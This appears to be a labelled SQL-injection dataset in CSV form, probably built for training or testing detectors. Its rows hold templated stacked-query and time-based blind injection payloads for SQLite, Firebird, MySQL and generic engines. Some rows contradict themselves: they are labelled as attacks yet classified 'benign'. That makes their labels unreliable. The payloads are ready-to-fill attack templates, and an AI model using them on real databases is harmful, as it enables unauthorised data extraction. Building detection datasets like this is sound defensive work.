row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
41250,";SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) ;SELECT (CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)",1,stacked_queries,stacked_queries,sqlite,0.95,;SELECT  detected — stacked_queries injection (priority 3) on sqlite,rule-based
41251,";SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4 ;SELECT IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM]) FROM RDB$DATABASE",1,stacked_queries,stacked_queries,firebird,0.95,;SELECT  detected — stacked_queries injection (priority 3) on firebird,rule-based
41252,";SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3 ;SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3",1,stacked_queries,stacked_queries,generic,0.95,;SELECT  detected — stacked_queries injection (priority 3) on generic,rule-based
41253,";CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ;CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) END",1,stacked_queries,benign,generic,0.8,No attack signals detected in payload,rule-based
41254,";CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ;CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) END",1,stacked_queries,benign,generic,0.8,No attack signals detected in payload,rule-based
41255,"AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR]) AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",1,time_blind,time_blind,mysql,0.95,"SLEEP(, IF([INFERENCE],0,[SLEEP is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
41256,"OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR]) OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",1,time_blind,time_blind,mysql,0.95,"SLEEP(, IF([INFERENCE],0,[SLEEP is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
41257,"AND SLEEP([SLEEPTIME]) AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])",1,time_blind,time_blind,mysql,0.95,"SLEEP(, IF(([INFERENCE]),SLEEP([SLEEP, AND SLEEP is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
41258,"OR SLEEP([SLEEPTIME]) OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])",1,time_blind,time_blind,mysql,0.95,"SLEEP(, IF(([INFERENCE]),SLEEP([SLEEP, OR SLEEP is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
41259,"AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')) AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])",1,time_blind,time_blind,generic,0.95,"BENCHMARK(, IF(([INFERENCE]),BENCHMARK([SLEEP is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
